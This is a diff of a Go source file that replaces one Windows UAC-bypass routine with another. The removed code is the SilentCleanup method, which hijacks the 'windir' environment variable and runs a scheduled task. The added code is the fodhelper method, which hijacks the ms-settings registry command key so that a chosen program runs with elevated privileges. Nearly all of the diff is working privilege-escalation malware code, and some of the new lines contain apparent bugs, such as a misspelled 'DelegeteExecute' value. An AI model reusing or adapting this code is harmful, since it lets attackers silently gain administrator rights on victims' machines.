@@ -6,25 +6,25 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
-	"syscall"
 	"time"
 
 	"golang.org/x/sys/windows/registry"
 )
 
-func HWND_W32_Method_SilentCleanUp(path string) error {
+func HWND_W32_Method_Fodhelper(path string) error {
 	var wkey32 registry.Key
 	var err error
 
-	var c = __W32_SilentCleanUp__{
-		Type:   "_silentcleanup",
+	var c = __W32_Fodhelper__{
+		Type:   "_fodhelper",
 		Method: "registry-command",
-		Scode: [2]uintptr{
-			0x02fdd, 0x03f,
+		Scode: [4]uintptr{
+			0x01, 0x0911c,
+			0xebb, 0x037cb,
 		},
 
-		Location:         fmt.Sprintf("%s\\_silentcleanup.gUAC", os.Getenv("APPDATA")),
-		_K_SilentCleanUp: 0x7,
+		Location:     fmt.Sprintf("%s\\_fodhelper.gUAC", os.Getenv("APPDATA")),
+		_K_Fodhelper: 0x2,
 	}
 
 	if len(c.Type)&len(c.Method) == 0 {
@@ -42,24 +42,31 @@ func HWND_W32_Method_SilentCleanUp(path string) error {
 	}
 
 	_, _, err = registry.CreateKey(
-		registry.CURRENT_USER, `Environment`,
+		registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open\command`,
 		registry.SET_VALUE)
 	if err != nil {
 		log.Println(err)
 	}
 
 	wkey32, err = registry.OpenKey(
-		registry.CURRENT_USER, `Environment`,
+		registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open\command`,
 		registry.QUERY_VALUE|registry.SET_VALUE,
 	)
 	if err != nil {
 		log.Println(err)
 	}
 
-	// Setting "windir" key value for the ABSOLUTE program path
+	// Setting DEFAULT key value for the ABSOLUTE program path
 	// +0x23df ...
 
-	if err := wkey32.SetStringValue("windir", fmt.Sprintf("cmd /k %s", currentDir)); err != nil {
+	if err := wkey32.SetStringValue("", currentDir); err != nil {
+		log.Println(err)
+	}
+
+	// Setting DelegateExecute key value for None-Value program path
+	// +0x32cc ...
+
+	if err := wkey32.SetStringValue("DelegeteExecute", ""); err != nil {
 		log.Println(err)
 	}
 
@@ -73,17 +80,20 @@ func HWND_W32_Method_SilentCleanUp(path string) error {
 	// Sleep for 5 seconds ...
 	time.Sleep(5 * 1 * time.Second)
 
-	// Executing EventVWR.exe
+	// Executing Fodhelper.exe
 	// Executing ABSOLUTE program name with high privileges
 
-	var cmd = exec.Command("cmd", "/C", "schtasks /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I")
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	_, err = cmd.Output()
+	var cmd = exec.Command("start fodhelper.exe")
+	err = cmd.Run()
+
+	// Sleep for 5 seconds ...
+	time.Sleep(5 * 1 * time.Second)
+
+	// Delete registry key ...
+	err = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open\command`)
 	if err != nil {
 		log.Println(err)
 	}
 
-	// Sleep for 1 second ...
-	time.Sleep(1 * 1 * time.Second)
 	return err
 }
